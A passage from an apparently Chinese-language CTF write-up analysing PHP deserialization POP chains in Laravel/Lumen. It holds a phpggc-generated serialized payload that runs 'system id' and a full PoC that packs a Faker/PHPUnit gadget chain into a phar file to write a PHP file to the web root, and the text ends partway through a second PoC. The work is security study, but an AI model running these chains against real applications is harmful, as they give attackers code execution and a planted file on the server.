class="line">        <span class="keyword">if</span> ($halt &amp;&amp; ! is_null($response)) &#123;</span><br><span class="line">            <span class="keyword">return</span> $response;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($response === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $responses[] = $response;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $halt ? <span class="keyword">null</span> : $responses;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>此处只看<code>$event</code>变量的传递，所以继续跟入<code>getListeners</code>函数，可以看到我们传入的类名肯定是不存在的，因此这个函数必定返回<code>$listeners</code>变量的值。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getListeners</span><span class="params">($eventName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $listeners = <span class="keyword">$this</span>-&gt;listeners[$eventName] ?? [];</span><br><span class="line"></span><br><span class="line">    $listeners = array_merge(</span><br><span class="line">        $listeners,</span><br><span class="line">        <span class="keyword">$this</span>-&gt;wildcardsCache[$eventName] ?? <span class="keyword">$this</span>-&gt;getWildcardListeners($eventName)</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> class_exists($eventName, <span class="keyword">false</span>)</span><br><span class="line">                ? <span class="keyword">$this</span>-&gt;addInterfaceListeners($eventName, $listeners)</span><br><span class="line">                : $listeners;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>假设我们使用phpggc生成的payload如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> zeroyu@zeros ~ ./phpggc Laravel/RCE2 system id</span><br><span class="line">O:40:<span class="string">"Illuminate\Broadcasting\PendingBroadcast"</span>:2:&#123;s:9:<span class="string">"*events"</span>;O:28:<span class="string">"Illuminate\Events\Dispatcher"</span>:1:&#123;s:12:<span class="string">"*listeners"</span>;a:1:&#123;s:2:<span class="string">"id"</span>;a:1:&#123;i:0;s:6:<span class="string">"system"</span>;&#125;&#125;&#125;s:8:<span class="string">"*event"</span>;s:2:<span class="string">"id"</span>;&#125;</span><br></pre></td></tr></table></figure></p>
<p>那么最终dispatch函数中的<code>$response = $listener($event, $payload);</code>对应返回的就是<code>$response=system(&#39;id&#39;,[]);</code>此时<code>$response</code>将保存有命令执行后的结果。</p>
<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p><img src="https://i.loli.net/2020/06/04/WtPgK6V9yrzF3cl.png" alt="3CC61DDE-DA5C-4278-B0C8-6FDEDBB79714.png"></p>
<p>由下面这句代码展开分析<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)</span><br></pre></td></tr></table></figure></p>
<p>反序列化的时候首先还是到<code>PendingBroadcast</code>中调用<code>__destruct</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所这次的就相当于<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Notifications\ChannelManager($function, $parameter)-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br></pre></td></tr></table></figure></p>
<p>要知道<code>ChannelManager</code>里面是没有<code>dispatch</code>函数的，所以就会调用<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;driver()-&gt;$method(...$parameters);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><code>$method(...$parameters);</code>这部分并不重要，之后主要跟进<code>driver</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">driver</span><span class="params">($driver = null)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $driver = $driver ?: <span class="keyword">$this</span>-&gt;getDefaultDriver();</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;drivers[$driver])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;drivers[$driver] = <span class="keyword">$this</span>-&gt;createDriver($driver);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;drivers[$driver];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>之前我们设置了如下几个变量，所以在此处<code>getDefaultDriver();</code>将返回<code>x</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">$this</span>-&gt;app = $parameter;</span><br><span class="line"><span class="keyword">$this</span>-&gt;customCreators = [<span class="string">'x'</span> =&gt; $function];</span><br><span class="line"><span class="keyword">$this</span>-&gt;defaultChannel = <span class="string">'x'</span>;</span><br></pre></td></tr></table></figure></p>
<p>接下来会继续到<code>createDriver</code>函数的位置，之后跟进一下这个函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">createDriver</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;customCreators[$driver])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callCustomCreator($driver);</span><br></pre></td></tr></table></figure></p>
<p>可以看到接下来继续进入<code>callCustomCreator</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callCustomCreator</span><span class="params">($driver)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;customCreators[$driver](<span class="keyword">$this</span>-&gt;app);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>也正是在此处返回了<code>$function($parameter)</code>的执行结果。</p>
<h4 id="第四种"><a href="#第四种" class="headerlink" title="第四种"></a>第四种</h4><p><img src="https://i.loli.net/2020/06/04/QmCRgJausZ3DBLj.png" alt="A8C1FFAB-D86C-4B3B-B50D-DC4296B52A29.png"></p>
<p>首先看一下这个chain的开始<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Broadcasting\PendingBroadcast(<span class="keyword">new</span> \Illuminate\Validation\Validator($function),$parameter);</span><br></pre></td></tr></table></figure></p>
<p>可以看到，这链也是从<code>PendingBroadcast</code>的<code>__destruct</code>开始的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;events-&gt;dispatch(<span class="keyword">$this</span>-&gt;event);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以此处对应的执行就是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> \Illuminate\Validation\Validator($function)-&gt;dispatch($parameter);</span><br></pre></td></tr></table></figure></p>
<p>可以看到<code>Validator</code>类中也是没有<code>dispatch</code>函数的，因此调用的是<code>__call</code>函数<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($method, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $rule = Str::snake(substr($method, <span class="number">8</span>));</span><br><span class="line">    <span class="comment">// $rule=''</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;extensions[$rule])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callExtension($rule, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> BadMethodCallException(<span class="string">"Method [$method] does not exist."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>之后跟进<code>callExtension</code>函数，在其中的<code>call_user_func_array</code>处成功执行我们需要执行的函数。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">callExtension</span><span class="params">($rule, $parameters)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $callback = <span class="keyword">$this</span>-&gt;extensions[$rule];</span><br><span class="line">	<span class="comment">// 之前chain中写的是$this-&gt;extensions = ['' =&gt; $function];所以此处的$callback=$function</span></span><br><span class="line">    <span class="keyword">if</span> (is_callable($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> call_user_func_array($callback, $parameters);</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (is_string($callback)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;callClassBasedExtension($callback, $parameters);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这四种chain的分析可以参考<a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">《PHP反序列化入门之寻找POP链(一)》</a><br>PS:但是文中对第三种的分析存在一些问题，可以参考我的表述</p>
<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>总结起来以上四种类型要么是利用调用<code>dispatch</code>来完成，要么是利用<code>$this-&gt;events</code>中的<code>__call</code>完成。</p>
<h3 id="3-POP-chain的构造"><a href="#3-POP-chain的构造" class="headerlink" title="3. POP chain的构造"></a>3. POP chain的构造</h3><p>pop chain的构造一般都是从寻找<code>__wakeup</code> 或者 <code>__destruct</code>开始的<br>寻找思路: </p>
<ol>
<li>找<code>dispatch</code>完成合适的函数调用</li>
<li><p>寻找合适的<code>$this-&gt;events</code>来使用其中的<code>__call</code></p>
<h4 id="chain-1"><a href="#chain-1" class="headerlink" title="chain 1"></a>chain 1</h4></li>
<li><p>入口点  cat/vendor/illuminate/broadcasting/PendingBroadcast.php <code>__destruct()</code></p>
</li>
<li>cat/vendor/fzaninotto/faker/src/Faker/ValidGenerator.php <code>__call($name, $arguments)</code><br>在这其中call_user_func_array函数的返回结果作为call_user_func函数的参数，$this-&gt;validator又是可控的，进而call_user_func函数的参数均是可控的。但是想用file_put_contents函数来写shell需要两个参数，所以call_user_func不能够直接使用，需要继续寻找一个call_user_func_array函数来用</li>
<li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php <code>invoke(Invocation $invocation)</code>函数存在一个call_user_func_array函数，其中第一个参数可控，第二个参数需要Invocation对象</li>
<li>cat/vendor/phpunit/phpunit/src/Framework/MockObject/Invocation/StaticInvocation.php 中找到对接口<code>Invocation</code>的实现</li>
</ol>
<p>最终构造出的poc如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">       <span class="keyword">protected</span> $event;</span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">DefaultGenerator</span>&#123;</span><br><span class="line">       <span class="title">protected</span> $<span class="title">default</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($default = null)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;default = $default;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">       <span class="keyword">protected</span> $generator;</span><br><span class="line">       <span class="keyword">protected</span> $validator;</span><br><span class="line">       <span class="keyword">protected</span> $maxRetries;</span><br><span class="line">       <span class="comment">// __call方法中有call_user_func_array、call_user_func</span></span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator = null, $maxRetries = <span class="number">10000</span>)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">ReturnCallback</span></span><br><span class="line">   &#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">callback</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($callback)</span></span></span><br><span class="line"><span class="function">       </span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;callback = $callback;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">   <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">       <span class="title">private</span> $<span class="title">parameters</span>;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($parameters)</span></span>&#123;</span><br><span class="line">           <span class="keyword">$this</span>-&gt;parameters = $parameters;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">   $function = 'file_put_contents';</span><br><span class="line">   $parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">   $staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">   $returncallback = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function);</span><br><span class="line">   $defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br><span class="line">   $validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">   $pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br><span class="line">   $o = $pendingbroadcast;</span><br><span class="line">   $filename = <span class="string">'poc.phar'</span>;<span class="comment">// 后缀必须为phar，否则程序无法运行</span></span><br><span class="line">   file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">   $phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">   $phar-&gt;startBuffering();</span><br><span class="line">   $phar-&gt;setStub(<span class="string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">   $phar-&gt;setMetadata($o);</span><br><span class="line">   $phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">   $phar-&gt;stopBuffering();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>poc执行过程分析</p>
<ol>
<li><p>起始点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$validgenerator = <span class="keyword">new</span> Faker\ValidGenerator($defaultgenerator,<span class="keyword">array</span>($returncallback,<span class="string">'invoke'</span>),<span class="number">2</span>);</span><br><span class="line">$pendingbroadcast = <span class="keyword">new</span> Illuminate\Broadcasting\PendingBroadcast($validgenerator,<span class="number">123</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>可以看到首先也是进入到了<strong>destruct()，将dispatch作为函数调用进行了使用，但是ValidGenerator类中没有这个函数，所以就调用</strong>call，参数为dsipatch和123。此处要注意到ValidGenerator的几个参数分别是<code>$defaultgenerator,array($returncallback,&#39;invoke&#39;),2</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$parameters = <span class="keyword">array</span>(<span class="string">'/var/www/html/11.php'</span>,<span class="string">'&lt;?php phpinfo();?&gt;'</span>);</span><br><span class="line">$staticinvocation = <span class="keyword">new</span> PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</span><br><span class="line">$defaultgenerator = <span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>因此下面这句中的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$res = call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>-&gt;generator, $name), $arguments);</span><br></pre></td></tr></table></figure></p>
<p><code>array($this-&gt;generator, $name)</code>实际上就是执行了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> Faker\DefaultGenerator($staticinvocation)-&gt;dispatch</span><br></pre></td></tr></table></figure></p>
<p>但是DefaultGenerator中也没有dispatch函数吗，因此就调用<strong>call函数来处理，他的</strong>call函数是直接将$staticinvocation的值进行返回</p>
<ol start="3">
<li><code>new PHPUnit\Framework\MockObject\Invocation\StaticInvocation($parameters);</code> 是一个实例化后的Invocation对象，并且它可以给出我们需要参数array，也就是<code>$res = 这个对象</code></li>
<li>接下来回到$validgenerator = new Faker\ValidGenerator($defaultgenerator,array($returncallback,’invoke’),2);继续看其中的<code>call_user_func($this-&gt;validator, $res)</code>这里的<code>$this-&gt;validator</code>其实就是<code>array($returncallback,&#39;invoke&#39;)</code>，整体对应的含义如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> PHPUnit\Framework\MockObject\Stub\ReturnCallback($function)-&gt;invoke($res);</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>invoke的函数定义如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">invoke</span><span class="params">(Invocation $invocation)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> \call_user_func_array(<span class="keyword">$this</span>-&gt;callback, $invocation-&gt;getParameters());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>可以看到$res变量所对应的对象在此处将取出我们需要的$parameters，而$this-&gt;callback就是我们之前设置的$function</p>
<h4 id="chain-2"><a href="#chain-2" class="headerlink" title="chain 2"></a>chain 2</h4><p>这个pop chain出自lemon师傅，只这条相较于上条答题相同但是比较绕，我在注释已经做了详细的解释。<br>参考:<br><a href="https://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/#%E5%AF%BB%E6%89%BEPOP-Chain" target="_blank" rel="noopener">《lumenserial–kingkk》</a><br><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html#_label0" target="_blank" rel="noopener">《lumenserial-l3m0n》</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Illuminate</span>\<span class="title">Broadcasting</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">PendingBroadcast</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">events</span>;</span><br><span class="line">        <span class="keyword">protected</span> $event;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($events, $event)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;event = $event;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events = $events;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Generator</span>&#123;</span><br><span class="line">        <span class="title">protected</span> $<span class="title">formatters</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($forma)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters = $forma;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ValidGenerator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $generator;</span><br><span class="line">        <span class="keyword">protected</span> $validator;</span><br><span class="line">        <span class="keyword">protected</span> $maxRetries;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($generator, $validator, $maxRetries = <span class="number">10000</span>)</span></span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;generator = $generator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;validator = $validator;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;maxRetries = $maxRetries;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Invocation</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">StaticInvocation</span>&#123;</span><br><span class="line">        <span class="title">function</span> <span class="title">__construct</span>($<span class="title">parameters</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">parameters</span> = $<span class="title">parameters</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">PHPUnit</span>\<span class="title">Framework</span>\<span class="title">MockObject</span>\<span class="title">Stub</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">ReturnCallback</span>&#123;</span><br><span class="line">        <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">callback</span>)&#123;</span><br><span class="line">            $<span class="title">this</span>-&gt;<span class="title">callback</span> = $<span class="title">callback</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span 